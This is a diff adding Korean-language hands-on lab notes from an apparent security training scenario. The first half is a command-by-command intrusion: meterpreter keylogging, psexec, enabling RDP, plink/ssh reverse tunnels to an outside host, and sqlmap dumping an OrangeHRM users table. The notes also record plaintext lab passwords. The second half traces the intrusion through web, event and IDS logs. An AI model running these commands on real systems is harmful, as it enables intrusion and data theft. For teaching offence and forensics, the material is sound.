@@ -212,4 +212,205 @@ meterpreter> migrate [PID]
 meterpreter> shell
 c:\windows\> keylog.exe
 
+Step 3. VPN 계정 정보 남기기
+[Purcell-Office08-PC]
+> 윈도우키 + R
+> ncpa.cpl
+> Local Area Connection2 활설화
+administrator // DoapdlsServer12!@
 
+> HRM access(VPN) 접속
+hradmn // 인사관리서버
+
+> URL 192.168.13.100 접속
+admin // 인사관리대장
+
+> HRM access(VPN) 종료
+> LocalArea Connection2 비활성화
+
+Step 4. 키로그 결과 확인
+msf exploit(handler) > sessions -i [ID]
+meterpreter> shell
+c:\windows\system32> cd c:\users\purcell.coresec0\downloads
+c:\windows\system32> type keylog.pkv
+
+Hands-On) RDP 통신을 위한 도구 업로드
+
+Step 1. 공격 도구 준비
+[새로운 터미널창 오픈]
+#sudo su
+cd /tools
+cp RDPWrap-v1.5.zip temp
+#cd temp
+#unzip RDPWrap-v1.5.zip
+#rm -rf RDPWrap-v1.5.zip
+
+[Dobney Users]
+c:\windows\temp> psexec -accepteula \\purcell-pc.coresec.com -s -d cmd.exe /c "C:\windows\temp\rt.exe"
+
+purcell system 쉘 획득 가능
+
+Step 2. purcell pc에 공격 도구 업로드
+meterpreter> upload -r /tools/temp c:\\windows\\temp
+meterpreter> upload /tools/rdp_enable.bat c:\\windows\\temp
+
+Step 3. RDP 서비스 활성화
+[PURcell-PC]
+meterpreter> shell
+c:\windows\system32> cd:\\windows\\temp
+c:=windows\temp> rdp_enable.bat
+c:\windows\temp> install.bat
+
+Step 4. SSH 포트포워딩
+[Dobney]
+c:\windows\temp> plink -R 2222:192.168.10.12:22 black@121.34.43.137
+
+Step 5. SSH 터널링
+#ssh fladmn@127.0.0.1 -p 2222
+
+Step 6. RDP 포트포워딩
+[터널링 된 파일공유 서버 쉘]
+#ssh -R 3389:192.168.12.100:3389 black@121.34.43.137
+
+Step 7. RDP 접속
+#rdesktop 127.0.0.1 -f -u administrator -d coresec0 -p -
+Password?
+
+
+
+
+
+
+document.cookie
+
+[DB 확인]
+sqlmap.py -u "http://192.168.13.100/orangehrm-2.6.11/lib/controllers/CentralController.php?capturemode=updatemode&uniqcode=NAT&id=1" --cookie="[세션 ID]" --dbs
+
+[테이블 확인]
+sqlmap.py -u "http://192.168.13.100/orangehrm-2.6.11/lib/controllers/CentralController.php?capturemode=updatemode&uniqcode=NAT&id=1" --cookie="[세션 ID]" -D orangehrm_mysql --tables
+
+[컬럼 확인]
+sqlmap.py -u "http://192.168.13.100/orangehrm-2.6.11/lib/controllers/CentralController.php?capturemode=updatemode&uniqcode=NAT&id=1" --cookie="[세션 ID]" -D orangehrm_mysql -T hs_hr__users --columns
+
+[덤프]
+sqlmap.py -u "http://192.168.13.100/orangehrm-2.6.11/lib/controllers/CentralController.php?capturemode=updatemode&uniqcode=NAT&id=1" --cookie="[세션 ID]" -D orangehrm_mysql  -T hs_hr_users --dump
+
+
+--------------대응---------------
+1. HRM server 조사
+
+**근거
+HRM 서버에는 연구 개발 인력들의 정보가 저장되어 있으며 웹 서비스로 관리가 되고 있다.
+
+**추론
+HRM 웹 서비스를 통해서 정보 유출의 가능성이 존재
+DB 정보가 유출된 것을 보아 SQL Injection 공격의 가능성이 있음
+
+**분석
+SQL Injection 흔적 찾아보기
+
+Web log
+- 모든 웹 서버에 공통적으로 제공되는 기능
+- 특정 웹사이트에 방문한 사용자들의 정보를 기록
+
+> 어디에서 방문했는가? : IP 주소, Domain 주소
+> 언제 방문했는가? : 방문한 시간 정보
+> 어떤 방식으로 접근/방문했는가? : GET/POST
+> 어떤 브라우저를 사용했는가? 
+
+Access_log
+- 서버가 처리하는 모든 요청을 기록
+
+Hands-On) HRM Server 웹 서비스 접근 로그 확인
+Step 1. Logparser 실행
+
+Step 2. SQL Injection에 사용될만한 문자열 검색
+
+Select RemoteHostName, Datetime, request, statuscode
+from [access_log 경로]
+where (request like '%select%'
+or request like '%from%'
+or request like '%where%'
+or request like '%truncate%'
+or request like '%insert%'
+or request like '%replace%'
+or request like '%update%')
+ 
+
+**결과
+sql injection 공격의 흔적이 발견
+> 시간정보
+- 2017-09-17 10:03~26 ~ 2017-09-08 12:25:17
+- 192.168.13.200에서 HRM server로 공격을 시도
+- Purcell의 VPN IP이다 > Purcell 분석 필요
+
+2. 퍼셀 PC 분석 1
+**근거
+- HRM 서버에서 퍼셀 VPM IP로 공격한 흔적이 발견됨
+
+**추론
+- vpn 접속을 위해서는 계정정보가 필요 > 이를 얻기위한 공격이 있었을 수 있음
+- 13.0 대역대는 VPM 사용시 할당되는 ip 주소이므로 vpn을 사용했을 것이다.
+
+**분석
+Browser History 분석
+Step 1. BrowserHistoryView
+바탕화면에 - tools - browse - BrowserHistoryView32
+
+Step 2. 히스토리 파일 분석
+
+Step 3. HRM 웹 서비스 접속 흔적 발견
+시간 정보 비교
+
+**결론
+> 시간정보
+2017-09-07 11:44:22 ~ 2017-09-07 12:11:40
+>내용
+office-pc-08 사용자가 HRM의 웹 서비스에 접속 
+
+2. 퍼셀 PC 분석 2
+**디벤트 로그(Event log)
+윈도우 시스템의 하드웨어, 소프트웨어, 시스템과 관련된 이벤트들을 기록한 정보
+확장자 : EVT > WIN VISTA > EVTX
+
+경로 : C:\Windows\SYSTEM32\\INEVT\logs
+
+System.evtx
+- 하드웨어의 오작동이나 새로운 서비스의 시작 및 중단에 대한 기록
+
+security.evtx
+- 파일에 대한 접근, 게정 생성, 권한 등에 대한 기록
+
+application.evtx
+
+**분석
+
+Step 1. 로그 파서 실행
+Step 2. VPM 관련 로그 조회
+
+Select timegenerated, eventid, message
+from [office-08의 system.evtx 파일 경로]
+where message like '%vpn%'
+
+로그 타입 : EVTLOG
+
+**결과
+웹서비스 접근 시간과 유사한 시간에 vpn 접속 흔적이 발견됨
+
+3. 퍼셀 PC 분석 3
+당시 상황의 네트워크 상황을 조사
+
+NETSTAT : 해당 시스템의 네트워크상태를 보여줌
+
+바탕화면 - aRTIFACT - oFFICE-08.NETSTAT.TXT
+**결과 3389(RDP) 포트가 열려있는걸 확인
+
+4. 퍼셀 PC 분석 4
+**분석
+ids에서 rdp 서비스의 사용여부를 조사
+
+sTEP 1. rdp 관련 로그 조사
+바탕화면 - artifact - ids - 날짜
+
+**결론
+9월 7일과 8일에 걸쳐 192.168.12.10(파일서버)에서 Office-08에 RDP 통신으로 연결한 흔적 발견
